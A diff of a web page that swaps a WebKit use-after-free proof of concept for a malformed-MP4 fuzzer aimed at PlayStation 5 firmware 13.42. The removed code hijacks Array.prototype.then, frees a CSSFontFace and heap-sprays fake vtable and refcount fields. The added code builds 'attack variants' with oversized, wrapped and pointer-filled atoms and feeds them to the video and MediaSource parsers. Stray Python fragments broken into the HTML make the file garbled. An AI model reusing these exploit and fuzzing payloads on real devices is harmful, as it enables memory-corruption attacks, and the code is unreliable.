@@ -1,206 +1,398 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PS5 MP4 Parser Fuzzer — FW 13.42</title>
+<style>
+  :root {
+    --bg: #0d0d0d; --surface: #1a1a1a; --surface-raised: #222; --surface-muted: #141414;
+    --border: #333; --text-primary: #e8e8e8; --text-secondary: #aaa; --text-tertiary: #777;
+    --text-quaternary: #555; --accent: #4a9eff; --danger: #ff4a4a; --positive: #4aff88;
+    --warning: #ffaa33;
+    --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    --font-mono: "SF Mono", "Fira Code", "Cascadia Code", monospace;
+  }
+  * { box-sizing: border-box; }
+  body { margin:0; padding:16px; background:var(--bg); color:var(--text-primary); font-family:var(--font-sans); font-size:16px; line-height:1.5; }
+  .container { max-width:900px; margin:0 auto; }
+  .section { margin-bottom:20px; border:1px solid var(--border); border-radius:12px; padding:16px; background:var(--surface); }
+  .section-title { font-size:17px; font-weight:600; margin-bottom:12px; color:var(--text-primary); letter-spacing:0.3px; }
+  .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
+  .grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; }
+  .input-group { display:flex; flex-direction:column; gap:4px; }
+  .input-group label { font-size:12px; color:var(--text-tertiary); font-weight:500; text-transform:uppercase; letter-spacing:0.5px; }
+  input, select, textarea { padding:10px 12px; border:1px solid var(--border); border-radius:10px; font-size:14px; background:var(--surface-muted); color:var(--text-primary); font-family:var(--font-sans); outline:none; transition:border-color 0.15s; }
+  input:focus, select:focus, textarea:focus { border-color:var(--accent); }
+  .btn { padding:10px 18px; border-radius:10px; border:1px solid var(--border); background:var(--surface-raised); color:var(--text-primary); font-size:14px; font-weight:500; cursor:pointer; transition:all 0.15s; font-family:var(--font-sans); }
+  .btn:hover { background:#333; border-color:#444; }
+  .btn-primary { background:var(--text-primary); color:var(--bg); border-color:var(--text-primary); }
+  .btn-primary:hover { opacity:0.85; }
+  .btn-danger { background:rgba(255,74,74,0.12); color:var(--danger); border-color:rgba(255,74,74,0.3); }
+  .btn-sm { padding:7px 14px; font-size:12px; }
+  .variant-card { border:1px solid var(--border); border-radius:10px; padding:12px 14px; margin-bottom:8px; background:var(--surface-muted); cursor:pointer; transition:all 0.15s; }
+  .variant-card:hover { border-color:#444; }
+  .variant-card.selected { border-color:var(--accent); background:rgba(74,158,255,0.08); }
+  .variant-name { font-weight:600; font-size:14px; color:var(--text-primary); }
+  .variant-desc { font-size:12px; color:var(--text-tertiary); margin-top:3px; }
+  .tag { display:inline-block; padding:2px 8px; border-radius:6px; font-size:11px; font-weight:500; margin-left:6px; }
+  .tag-info { background:rgba(74,158,255,0.12); color:var(--accent); }
+  .tag-danger { background:rgba(255,74,74,0.12); color:var(--danger); }
+  .tag-warn { background:rgba(255,170,51,0.15); color:var(--warning); }
+  .log-area { background:var(--surface-muted); border-radius:10px; padding:12px; font-family:var(--font-mono); font-size:12px; line-height:1.7; max-height:320px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; color:var(--text-secondary); border:1px solid var(--border); }
+  .log-entry { margin-bottom:3px; padding:2px 0; border-bottom:1px solid rgba(255,255,255,0.04); }
+  .log-time { color:var(--text-quaternary); margin-right:8px; }
+  .log-ok { color:var(--positive); }
+  .log-err { color:var(--danger); }
+  .log-warn { color:var(--warning); }
+  .log-info { color:var(--accent); }
+  .hex-dump { font-family:var(--font-mono); font-size:11px; line-height:1.6; background:var(--surface-muted); border-radius:10px; padding:12px; max-height:220px; overflow-y:auto; white-space:pre; color:var(--text-secondary); border:1px solid var(--border); }
+  .status-bar { display:flex; gap:20px; padding:12px 16px; background:var(--surface-raised); border-radius:10px; margin-bottom:16px; flex-wrap:wrap; }
+  .status-item { font-size:13px; color:var(--text-secondary); }
+  .status-item strong { color:var(--text-primary); font-weight:600; }
+  .flex-row { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
+  .result-row { display:flex; justify-content:space-between; align-items:center; padding:10px 14px; border-radius:8px; background:var(--surface-muted); margin-bottom:6px; font-size:13px; border:1px solid var(--border); }
+  .result-row.crashed { background:rgba(255,74,74,0.06); border-color:rgba(255,74,74,0.25); }
+  .result-row.frozen { background:rgba(255,170,51,0.06); border-color:rgba(255,170,51,0.25); }
+  .result-row.leaked { background:rgba(74,255,136,0.06); border-color:rgba(74,255,136,0.25); }
+  .note { font-size:12px; color:var(--text-tertiary); padding:10px 14px; border-radius:8px; background:rgba(255,170,51,0.08); border:1px solid rgba(255,170,51,0.2); line-height:1.6; }
+</style>
+</head>
 <body>
-<h2>PoC 13: UAF Confirmation via Stress + GC</h2>
-<button onclick="runStress()">ابدأ Stress Test</button>
-<div id="out" style="font-family: monospace; white-space: pre; background: #000; color: #0f0; padding: 10px; min-height: 600px;"></div>
 
-<script>
-let logs = [];
-function log(msg) {
-    logs.push(msg);
-    document.getElementById('out').textContent = logs.join('\n');
+<div class="container">
+
+  <div style="text-align:center; margin-bottom:20px;">
+    <h1 style="font-size:22px; font-weight:700; margin:0; color:var(--text-primary);">PS5 MP4 Parser Fuzzer</h1>
+    <p style="font-size:13px; color:var(--text-tertiary); margin:6px 0 0 0;">Target: Sony PlayStation 5 — Firmware 13.42 — libSceAvPlayer / WebKit Media</p>
+  </div>
+
+  <div class="status-bar">
+    <div class="status-item">Target: <strong>PS5 FW 13.42</strong></div>
+    <div class="status-item">Parser: <strong>libSceAvPlayer / WebKit Media</strong></div>
+    <div class="status-item">Bug Class: <strong>Container Size Confusion</strong></div>
+    <div class="status-item">Tests: <strong id="test-count">0</strong></div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">1. Custom Variant Builder</div>
+    <div class="grid-2">
+      <div class="input-group"><label>Parent meta atom size (bytes)</label><input type="number" id="parent-size" value="90" min="8" max="65535"></div>
+      <div class="input-group"><label>Child atom declared size (bytes)</label><input type="number" id="child-size" value="190" min="8" max="4294967295"></div>
+      <div class="input-group"><label>Child atom type (4 chars)</label><input type="text" id="child-type" value="\\x00\\x00\\x00\\x00" maxlength="4"></div>
+      <div class="input-group"><label>Nesting depth</label><select id="nest-depth"><option value="1">Single meta</option><option value="2">Double nested meta</option><option value="3">Triple nested</option></select></div>
+      <div class="input-group"><label>Overflow strategy</label><select id="overflow-mode"><option value="child-bigger">Child &gt; Parent (classic)</option><option value="zero-size">Child size = 0</option><option value="max-u32">Child size = 0xFFFFFFFF</option><option value="negative">Child size = 0x80000001 (signed)</option><option value="recursive">Recursive self-reference</option></select></div>
+      <div class="input-group"><label>Payload fill byte</label><select id="fill-byte"><option value="0x00">0x00 (NULLs)</option><option value="0x41">0x41 (A)</option><option value="0xDE">0xDE (marker)</option><option value="0xFF">0xFF (all bits set)</option><option value="pattern">Pointer pattern (0xDEADBEEF)</option></select></div>
+    </div>
+    <div class="flex-row" style="margin-top:14px;">
+      <button class="btn btn-primary" onclick="buildVariant()">Build & Preview</button>
+      <button class="btn" onclick="resetBuilder()">Reset</button>
+      <button class="btn" onclick="downloadCustom()">Download .mp4</button>
+    </div>
+    <div id="hex-preview" class="hex-dump" style="margin-top:14px; display:none;"></div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">2. Preset Attack Variants</div>
+    <div id="variant-list"></div>
+    <div class="flex-row" style="margin-top:14px;">
+      <button class="btn btn-primary btn-sm" onclick="selectAllVariants()">Select all</button>
+      <button class="btn btn-sm" onclick="deselectAllVariants()">Deselect all</button>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">3. Test Configuration</div>
+    <div class="grid-3">
+      <div class="input-group"><label>Attack vector</label><select id="attack-vector"><option value="video-tag">&lt;video&gt; tag</option><option value="mediasource">MediaSource (MSE)</option><option value="both">Both vectors</option></select></div>
+      <div class="input-group"><label>Iterations per variant</label><input type="number" id="iterations" value="3" min="1" max="50"></div>
+      <div class="input-group"><label>Delay between tests (ms)</label><input type="number" id="delay" value="2000" min="500" max="10000"></div>
+    </div>
+    <div class="note" style="margin-top:14px;"><strong style="color:var(--warning);">Note:</strong> On PS5 13.42, MediaSource is supported but WebGL is disabled. The &lt;video&gt; tag routes through libSceAvPlayer backend. Monitor for freezes, error codes, or crashes. If the browser freezes for &gt;10s, the test is flagged as FREEZE (potential crash indicator).</div>
+    <div class="flex-row" style="margin-top:14px;">
+      <button class="btn btn-primary" onclick="runTests()">Run Selected Tests</button>
+      <button class="btn btn-danger" onclick="stopTests()">Stop</button>
+      <button class="btn" onclick="clearLogs()">Clear logs</button>
+      <button class="btn" onclick="exportResults()">Export JSON</button>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">4. Live Test Results</div>
+    <div id="results-area"><div style="color:var(--text-tertiary);font-size:13px;">No results yet. Run tests to see output.</div></div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">5. Execution Log</div>
+    <div id="log-area" class="log-area">[READY] PS5 MP4 Parser Fuzzer initialized.\nTarget: Sony PlayStation 5 / FW 13.42 / libSceAvPlayer\nBug class: Container Size Confusion (moov.udta.meta child &gt; parent)\n\nSelect variants and click "Run Selected Tests" to begin.\n</div>
+  </div>
+
+</div>
+''')
+
+html_parts.append('''<script>
+const presets = [
+  { id:"v1", name:"Shunsui Classic", desc:"Child=190, Parent=90 — original discovery by Shunsui", parent:90, child:190, type:"\\x00\\x00\\x00\\x00", mode:"child-bigger", fill:"0x41", nest:1 },
+  { id:"v2", name:"Max U32 Overflow", desc:"Child size = 0xFFFFFFFF — integer wrap test", parent:90, child:4294967295, type:"\\x00\\x00\\x00\\x00", mode:"max-u32", fill:"0xFF", nest:1 },
+  { id:"v3", name:"Signed Confusion", desc:"Child size = 0x80000001 — signed parse confusion", parent:90, child:2147483649, type:"\\x00\\x00\\x00\\x00", mode:"negative", fill:"0xDE", nest:1 },
+  { id:"v4", name:"Zero Child", desc:"Child size = 0 — infinite loop / division risk", parent:90, child:0, type:"\\x00\\x00\\x00\\x00", mode:"zero-size", fill:"0x00", nest:1 },
+  { id:"v5", name:"Deep Nest x3", desc:"Triple nested meta atoms — parser recursion test", parent:90, child:190, type:"\\x00\\x00\\x00\\x00", mode:"child-bigger", fill:"0x41", nest:3 },
+  { id:"v6", name:"Pointer Spray", desc:"Fill with fake pointer patterns (0xDEADBEEF)", parent:90, child:190, type:"\\x00\\x00\\x00\\x00", mode:"child-bigger", fill:"pattern", nest:1 },
+  { id:"v7", name:"Large Parent Small Child", desc:"Parent=4096, Child=8192 — bigger overflow", parent:4096, child:8192, type:"\\x00\\x00\\x00\\x00", mode:"child-bigger", fill:"0x41", nest:1 },
+  { id:"v8", name:"Recursive Self-Ref", desc:"Atom points to itself — loop test", parent:90, child:90, type:"meta", mode:"recursive", fill:"0x00", nest:1 },
+  { id:"v9", name:"Meta + Hdlr Confusion", desc:"Nested hdlr inside meta with wrong size", parent:120, child:250, type:"hdlr", mode:"child-bigger", fill:"0x41", nest:1 },
+  { id:"v10", name:"Moov Trak Confusion", desc:"trak atom inside moov with oversized child", parent:200, child:500, type:"trak", mode:"child-bigger", fill:"0x41", nest:1 },
+];
+
+let selectedVariants = new Set(presets.map(p => p.id));
+let testRunning = false, testAbort = false, testCount = 0, results = [], customMP4 = null;
+
+function renderVariants() {
+  const list = document.getElementById('variant-list');
+  list.innerHTML = presets.map(p => `
+    <div class="variant-card ${selectedVariants.has(p.id) ? 'selected' : ''}" onclick="toggleVariant('${p.id}')">
+      <div class="flex-row" style="justify-content:space-between;">
+        <span class="variant-name">${p.name}</span>
+        <span>
+          <span class="tag tag-info">P:${p.parent} C:${p.child}</span>
+          ${p.mode === 'max-u32' || p.mode === 'negative' ? '<span class="tag tag-danger">High Risk</span>' : ''}
+          ${p.nest > 1 ? '<span class="tag tag-warn">Deep</span>' : ''}
+        </span>
+      </div>
+      <div class="variant-desc">${p.desc}</div>
+    </div>
+  `).join('');
+}
+function toggleVariant(id) { if(selectedVariants.has(id)) selectedVariants.delete(id); else selectedVariants.add(id); renderVariants(); }
+function selectAllVariants() { presets.forEach(p => selectedVariants.add(p.id)); renderVariants(); }
+function deselectAllVariants() { selectedVariants.clear(); renderVariants(); }
+
+function writeU32(val) {
+  const buf = new Uint8Array(4);
+  buf[0] = (val >>> 24) & 0xFF; buf[1] = (val >>> 16) & 0xFF;
+  buf[2] = (val >>> 8) & 0xFF; buf[3] = val & 0xFF;
+  return buf;
+}
+function writeAtom(type, data) {
+  const te = new TextEncoder();
+  const typeBytes = te.encode(type.padEnd(4, '\\x00').slice(0,4));
+  const size = 8 + data.length;
+  const result = new Uint8Array(size);
+  result.set(writeU32(size), 0); result.set(typeBytes, 4); result.set(data, 8);
+  return result;
 }
 
-// CSSFontFace size on WebKit-1200 is ~0xC8 (200 bytes)
-// bmalloc size classes: 192, 208, 224, 256...
-// نستخدم 208 bytes spray (closest size class)
-const SPRAY_SIZE = 208;
-const SPRAY_COUNT = 10000;
-const STRESS_ITERATIONS = 50;
+function buildMP4(variant) {
+  const te = new TextEncoder();
+  // ftyp
+  const ftypData = new Uint8Array(16);
+  ftypData.set(te.encode('isom'), 0);
+  ftypData.set(new Uint8Array([0,0,2,0]), 4);
+  ftypData.set(te.encode('isom'), 8);
+  ftypData.set(te.encode('mp41'), 12);
+  const ftyp = writeAtom('ftyp', ftypData);
 
-// Heap spray بـ ArrayBuffers بحجم CSSFontFace
-function heapSpray() {
-    const spray = [];
-    const marker = 0xDEADBEEFCAFEBABEn;
-    
-    for (let i = 0; i < SPRAY_COUNT; i++) {
-        const buf = new ArrayBuffer(SPRAY_SIZE);
-        const view = new BigUint64Array(buf);
-        
-        // Marker في البداية عشان نعرف لو الـ reclaim نجح
-        view[0] = marker;
-        view[1] = marker + BigInt(i);
-        
-        // محاكاة vtable pointer (placeholder)
-        // على PS5 يحتاج ASLR defeat
-        view[2] = 0x4141414141414141n;
-        
-        // محاكاة refCount
-        view[3] = 1n;
-        
-        // محاكاة m_status = Success (3)
-        view[0x8A / 8] = 3n;
-        
-        spray.push(buf);
+  let metaContent;
+  if (variant.mode === 'recursive') {
+    const innerMeta = writeAtom('meta', new Uint8Array(4));
+    metaContent = new Uint8Array(4 + innerMeta.length);
+    metaContent.set(new Uint8Array([0,0,0,0]), 0);
+    metaContent.set(innerMeta, 4);
+  } else {
+    let childDataLen = variant.child;
+    if (childDataLen > 10000) childDataLen = 10000;
+    let fillByte;
+    if (variant.fill === '0x00') fillByte = 0x00;
+    else if (variant.fill === '0x41') fillByte = 0x41;
+    else if (variant.fill === '0xDE') fillByte = 0xDE;
+    else if (variant.fill === '0xFF') fillByte = 0xFF;
+    else if (variant.fill === 'pattern') {
+      const pat = new Uint8Array(childDataLen);
+      for (let i = 0; i < childDataLen; i += 4) { pat[i]=0xDE; pat[i+1]=0xAD; pat[i+2]=0xBE; pat[i+3]=0xEF; }
+      fillByte = pat;
     }
-    return spray;
+    const childData = new Uint8Array(childDataLen);
+    if (fillByte instanceof Uint8Array) childData.set(fillByte.slice(0, Math.min(fillByte.length, childDataLen)));
+    else childData.fill(fillByte);
+    const childType = variant.type.replace(/\\\\x00/g, '\\x00').replace(/\\\\x/g, '');
+    const childAtom = writeAtom(childType, childData);
+    let current = childAtom;
+    for (let i = 1; i < variant.nest; i++) {
+      const wrapper = new Uint8Array(4 + current.length);
+      wrapper.set(new Uint8Array([0,0,0,0]), 0); wrapper.set(current, 4);
+      current = writeAtom('meta', wrapper);
+    }
+    metaContent = new Uint8Array(4 + current.length);
+    metaContent.set(new Uint8Array([0,0,0,0]), 0); metaContent.set(current, 4);
+  }
+  const metaSize = Math.max(8, variant.parent);
+  const meta = new Uint8Array(metaSize);
+  meta.set(writeU32(metaSize), 0); meta.set(te.encode('meta'), 4);
+  meta.set(new Uint8Array([0,0,0,0]), 8);
+  const copyLen = Math.min(metaContent.length, metaSize - 12);
+  meta.set(metaContent.slice(0, copyLen), 12);
+  const udta = writeAtom('udta', meta);
+  const moov = writeAtom('moov', udta);
+  const result = new Uint8Array(ftyp.length + moov.length);
+  result.set(ftyp, 0); result.set(moov, ftyp.length);
+  return result;
 }
 
-function forceGC() {
-    // GC pressure عبر allocation + release
-    const pressure = [];
-    for (let i = 0; i < 100; i++) {
-        pressure.push(new ArrayBuffer(1024 * 1024)); // 1MB
-    }
-    pressure.length = 0;
-    
-    // Force synchronous GC (WebKit behavior)
-    document.body.offsetTop;
-    getComputedStyle(document.body).width;
+function buildVariant() {
+  const parent = parseInt(document.getElementById('parent-size').value);
+  const child = parseInt(document.getElementById('child-size').value);
+  const type = document.getElementById('child-type').value;
+  const nest = parseInt(document.getElementById('nest-depth').value);
+  const mode = document.getElementById('overflow-mode').value;
+  const fill = document.getElementById('fill-byte').value;
+  const variant = { id:'custom', name:'Custom', desc:'User-built variant', parent, child, type, mode, fill, nest };
+  customMP4 = buildMP4(variant);
+  const hex = Array.from(customMP4.slice(0, 256)).map(b => b.toString(16).padStart(2,'0')).join(' ');
+  const preview = document.getElementById('hex-preview');
+  preview.style.display = 'block';
+  preview.textContent = 'Built ' + customMP4.length + ' bytes\\n\\nFirst 256 bytes hex dump:\\n' + hex.match(/.{1,48}/g).join('\\n');
+  log('Built custom variant: ' + customMP4.length + ' bytes', 'ok');
+}
+function resetBuilder() {
+  document.getElementById('parent-size').value = 90;
+  document.getElementById('child-size').value = 190;
+  document.getElementById('child-type').value = '\\\\x00\\\\x00\\\\x00\\\\x00';
+  document.getElementById('nest-depth').value = '1';
+  document.getElementById('overflow-mode').value = 'child-bigger';
+  document.getElementById('fill-byte').value = '0x41';
+  document.getElementById('hex-preview').style.display = 'none';
+  customMP4 = null;
+}
+function downloadCustom() {
+  if (!customMP4) { log('Build a variant first!', 'warn'); return; }
+  const blob = new Blob([customMP4], {type:'video/mp4'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a'); a.href = url; a.download = 'mutado_custom.mp4'; a.click(); URL.revokeObjectURL(url);
+  log('Downloaded mutado_custom.mp4 (' + customMP4.length + ' bytes)', 'ok');
 }
 
-async function runOnce(iteration) {
-    return new Promise((resolve) => {
-        const style = document.createElement('style');
-        style.textContent = `
-            @font-face { font-family: "stress"; src: local("Arial"); unicode-range: U+0041; }
-            @font-face { font-family: "stress"; src: local("Arial"); unicode-range: U+0042; }
-        `;
-        document.head.appendChild(style);
-        
-        const probe = document.createElement('span');
-        probe.textContent = 'AB';
-        probe.style.fontFamily = 'stress';
-        document.body.appendChild(probe);
-        document.body.offsetTop;
-        
-        let fired = false;
-        let sprayHolder = null;
-        
-        const saved = Object.getOwnPropertyDescriptor(Array.prototype, 'then');
-        
-        function handler() {
-            if (fired) return;
-            fired = true;
-            
-            try {
-                // حذف الـ rule → تحرير CSSFontFace
-                style.sheet.deleteRule(0);
-                
-                // Heap spray فوراً
-                sprayHolder = heapSpray();
-                
-                // Force style update
-                document.body.offsetTop;
-                getComputedStyle(probe).fontFamily;
-            } catch(e) {}
-            
-            // Restore
-            if (saved) Object.defineProperty(Array.prototype, 'then', saved);
-            else delete Array.prototype.then;
-        }
-        
-        Object.defineProperty(Array.prototype, 'then', {
-            configurable: true,
-            get() {
-                handler();
-                return saved?.value;
-            }
-        });
-        
-        document.fonts.load('16px "stress"', 'AB').then((faces) => {
-            const result = {
-                iteration,
-                faces: faces.length,
-                fired,
-                sprayIntact: sprayHolder ? checkSprayIntegrity(sprayHolder) : null
-            };
-            
-            // Cleanup
-            style.remove();
-            probe.remove();
-            sprayHolder = null;
-            
-            resolve(result);
-        });
-    });
+function log(msg, type) {
+  const area = document.getElementById('log-area');
+  const time = new Date().toLocaleTimeString('en-US',{hour12:false,hour:'2-digit',minute:'2-digit',second:'2-digit'});
+  const cls = type==='ok'?'log-ok':type==='err'?'log-err':type==='warn'?'log-warn':'log-info';
+  area.innerHTML += '<div class="log-entry"><span class="log-time">['+time+']</span><span class="'+cls+'">'+msg+'</span></div>';
+  area.scrollTop = area.scrollHeight;
+}
+function clearLogs() { document.getElementById('log-area').innerHTML = '[CLEARED] Logs cleared. Ready for new tests.\\n'; document.getElementById('results-area').innerHTML = '<div style="color:var(--text-tertiary);font-size:13px;">No results yet. Run tests to see output.</div>'; results=[]; testCount=0; document.getElementById('test-count').textContent='0'; }
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+async function runTests() {
+  if (testRunning) { log('Tests already running!', 'warn'); return; }
+  testRunning = true; testAbort = false;
+  const vector = document.getElementById('attack-vector').value;
+  const iterations = parseInt(document.getElementById('iterations').value);
+  const delay = parseInt(document.getElementById('delay').value);
+  const toTest = presets.filter(p => selectedVariants.has(p.id));
+  if (toTest.length === 0 && !customMP4) { log('No variants selected!', 'err'); testRunning = false; return; }
+  log('Starting ' + toTest.length + ' variants x ' + iterations + ' iterations via ' + vector + '...', 'info');
+
+  for (const variant of toTest) {
+    if (testAbort) break;
+    for (let i = 0; i < iterations; i++) {
+      if (testAbort) break;
+      testCount++; document.getElementById('test-count').textContent = testCount;
+      const mp4 = buildMP4(variant);
+      const blob = new Blob([mp4], {type:'video/mp4'});
+      const url = URL.createObjectURL(blob);
+      log('Testing ' + variant.name + ' [' + (i+1) + '/' + iterations + '] — ' + mp4.length + ' bytes', 'info');
+      if (vector === 'video-tag' || vector === 'both') await testVideoTag(variant, url, i);
+      if ((vector === 'mediasource' || vector === 'both') && !testAbort) await testMediaSource(variant, blob, i);
+      URL.revokeObjectURL(url);
+      if (i < iterations - 1) await sleep(delay);
+    }
+  }
+  if (customMP4 && !testAbort) {
+    const blob = new Blob([customMP4], {type:'video/mp4'});
+    const url = URL.createObjectURL(blob);
+    log('Testing custom variant...', 'info');
+    if (vector === 'video-tag' || vector === 'both') await testVideoTag({name:'Custom'}, url, 0);
+    URL.revokeObjectURL(url);
+  }
+  log('Test run complete.', 'ok'); testRunning = false; renderResults();
+}
+function stopTests() { testAbort = true; log('Stop requested. Finishing current test...', 'warn'); }
+
+async function testVideoTag(variant, url, iter) {
+  return new Promise(resolve => {
+    const video = document.createElement('video');
+    const t0 = performance.now(); let resolved = false;
+    const finish = (status, detail) => {
+      if (resolved) return; resolved = true;
+      const elapsed = (performance.now() - t0).toFixed(1);
+      results.push({ variant: variant.name, vector: 'video-tag', iter: iter+1, status, detail, time: elapsed+'ms', timestamp: new Date().toISOString() });
+      log('  [video] ' + status + ': ' + detail + ' (' + elapsed + 'ms)', status==='CRASH'?'err':status==='FREEZE'?'warn':'ok');
+      video.src = ''; video.remove(); resolve();
+    };
+    const freezeTimer = setTimeout(() => finish('FREEZE', 'No response after 10s'), 10000);
+    video.onerror = () => { clearTimeout(freezeTimer); const code = video.error ? video.error.code : 'unknown'; const msg = video.error ? (video.error.message || 'code:'+code) : 'unknown error'; finish('ERROR', 'MediaError ' + code + ': ' + msg); };
+    video.onloadedmetadata = () => { clearTimeout(freezeTimer); finish('META_OK', 'Metadata parsed successfully'); };
+    video.oncanplay = () => { clearTimeout(freezeTimer); finish('CANPLAY', 'Can play event fired'); };
+    video.src = url; video.load();
+  });
 }
 
-function checkSprayIntegrity(spray) {
-    let corrupted = 0;
-    let reclaimed = 0;
-    
-    for (let i = 0; i < Math.min(spray.length, 100); i++) {
-        const view = new BigUint64Array(spray[i]);
-        
-        if (view[0] !== 0xDEADBEEFCAFEBABEn) {
-            corrupted++;
-            // هذا دليل على reclaim ناجح!
-            if (view[0] === 0n || view[0] > 0x1000000000000n) {
-                reclaimed++;
-            }
-        }
-    }
-    
-    return { corrupted, reclaimed, total: spray.length };
+async function testMediaSource(variant, blob, iter) {
+  return new Promise(async resolve => {
+    const t0 = performance.now(); let resolved = false;
+    const finish = (status, detail) => {
+      if (resolved) return; resolved = true;
+      const elapsed = (performance.now() - t0).toFixed(1);
+      results.push({ variant: variant.name, vector: 'mediasource', iter: iter+1, status, detail, time: elapsed+'ms', timestamp: new Date().toISOString() });
+      log('  [mse] ' + status + ': ' + detail + ' (' + elapsed + 'ms)', status==='CRASH'?'err':status==='FREEZE'?'warn':'ok');
+      resolve();
+    };
+    const freezeTimer = setTimeout(() => finish('FREEZE', 'No response after 10s'), 10000);
+    try {
+      const ms = new MediaSource();
+      const video = document.createElement('video');
+      video.src = URL.createObjectURL(ms);
+      ms.onsourceopen = async () => {
+        try {
+          const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+          const buf = await blob.arrayBuffer();
+          sb.appendBuffer(buf);
+          sb.onupdateend = () => { clearTimeout(freezeTimer); finish('APPEND_OK', 'Buffer appended successfully'); URL.revokeObjectURL(video.src); video.remove(); };
+          sb.onerror = () => { clearTimeout(freezeTimer); finish('SB_ERROR', 'SourceBuffer error'); URL.revokeObjectURL(video.src); video.remove(); };
+        } catch (e) { clearTimeout(freezeTimer); finish('EXCEPTION', e.message); URL.revokeObjectURL(video.src); video.remove(); }
+      };
+      ms.onerror = () => { clearTimeout(freezeTimer); finish('MS_ERROR', 'MediaSource error'); URL.revokeObjectURL(video.src); video.remove(); };
+    } catch (e) { clearTimeout(freezeTimer); finish('EXCEPTION', e.message); }
+  });
 }
 
-async function runStress() {
-    logs = [];
-    log('=== UAF Stress Test ===\n');
-    log(`Iterations: ${STRESS_ITERATIONS}`);
-    log(`Spray size: ${SPRAY_SIZE} bytes`);
-    log(`Spray count: ${SPRAY_COUNT}\n`);
-    
-    let totalCorrupted = 0;
-    let totalReclaimed = 0;
-    let facesCount = {};
-    
-    for (let i = 0; i < STRESS_ITERATIONS; i++) {
-        // Force GC بين المحاولات
-        if (i % 5 === 0) forceGC();
-        
-        const result = await runOnce(i);
-        
-        log(`Iter ${i}: faces=${result.faces}, fired=${result.fired}`);
-        
-        if (result.sprayIntact) {
-            totalCorrupted += result.sprayIntact.corrupted;
-            totalReclaimed += result.sprayIntact.reclaimed;
-            
-            if (result.sprayIntact.corrupted > 0) {
-                log(`  🔥 ${result.sprayIntact.corrupted} spray objects corrupted!`);
-                log(`  💀 ${result.sprayIntact.reclaimed} possibly reclaimed!`);
-            }
-        }
-        
-        facesCount[result.faces] = (facesCount[result.faces] || 0) + 1;
-        
-        // تأخير قصير
-        await new Promise(r => setTimeout(r, 50));
-    }
-    
-    log('\n=== Summary ===');
-    log(`Faces count distribution:`);
-    Object.entries(facesCount).forEach(([count, freq]) => {
-        log(`  faces=${count}: ${freq} times`);
-    });
-    
-    log(`\nTotal spray corrupted: ${totalCorrupted}`);
-    log(`Total possibly reclaimed: ${totalReclaimed}`);
-    
-    if (totalReclaimed > 0) {
-        log('\n🎉 UAF CONFIRMED! Spray objects were reclaimed by CSSFontFace!');
-        log('الخطوة التالية: التحكم في الـ reclaimed object قبل الـ vtable check');
-    } else if (totalCorrupted > 0) {
-        log('\n⚠️ Partial success: Spray corrupted but not clearly reclaimed');
-        log('جرب spray بحجم مختلف (224 bytes أو 256 bytes)');
-    } else {
-        log('\n❌ No evidence of UAF reclaim');
-        log('جرب: زيادة STRESS_ITERATIONS، أو استخدام workers للـ timing');
-    }
+function renderResults() {
+  const area = document.getElementById('results-area');
+  if (results.length === 0) { area.innerHTML = '<div style="color:var(--text-tertiary);font-size:13px;">No results yet. Run tests to see output.</div>'; return; }
+  const grouped = {};
+  results.forEach(r => { const key = r.variant + '|' + r.vector; if (!grouped[key]) grouped[key] = []; grouped[key].push(r); });
+  let html = '';
+  for (const [key, rs] of Object.entries(grouped)) {
+    const [name, vec] = key.split('|');
+    const crashes = rs.filter(r => r.status === 'CRASH' || r.status === 'FREEZE').length;
+    const errors = rs.filter(r => r.status === 'ERROR' || r.status === 'SB_ERROR' || r.status === 'MS_ERROR').length;
+    const oks = rs.filter(r => r.status === 'META_OK' || r.status === 'CANPLAY' || r.status === 'APPEND_OK').length;
+    let cls = ''; if (crashes > 0) cls = 'crashed'; else if (errors > 0) cls = 'frozen'; else if (oks > 0) cls = 'leaked';
+    html += '<div class="result-row ' + cls + '"><div><strong>' + name + '</strong> <span style="color:var(--text-quaternary);">(' + vec + ')</span><div style="font-size:11px;color:var(--text-tertiary);margin-top:2px;">' + rs.length + ' tests — ' + crashes + ' crash/freeze, ' + errors + ' errors, ' + oks + ' passed</div></div><div style="font-size:12px;color:var(--text-tertiary);">' + rs[rs.length-1].time + '</div></div>';
+  }
+  area.innerHTML = html;
 }
+function exportResults() {
+  if (results.length === 0) { log('No results to export!', 'warn'); return; }
+  const data = JSON.stringify(results, null, 2);
+  const blob = new Blob([data], {type:'application/json'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a'); a.href = url; a.download = 'ps5_mp4_fuzz_results_' + Date.now() + '.json'; a.click(); URL.revokeObjectURL(url);
+  log('Results exported to JSON', 'ok');
+}
+
+renderVariants();
+renderResults();
 </script>
 </body>
 </html>
